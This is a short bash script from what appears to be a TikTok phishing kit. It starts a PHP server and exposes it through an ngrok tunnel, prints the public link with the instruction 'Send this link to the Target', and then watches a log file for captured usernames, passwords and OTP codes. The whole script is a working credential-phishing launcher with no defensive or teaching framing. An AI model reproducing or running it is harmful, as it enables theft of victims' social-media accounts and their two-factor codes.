cd $HOME/
cd Tiktok/
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
./ngrok http 4444 > /dev/null 2>&1 &
sleep 10
echo ""
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
echo ""
echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
echo ""
tail -f usernames.txt | grep -e "username" -e "password" -e "OTP"                 
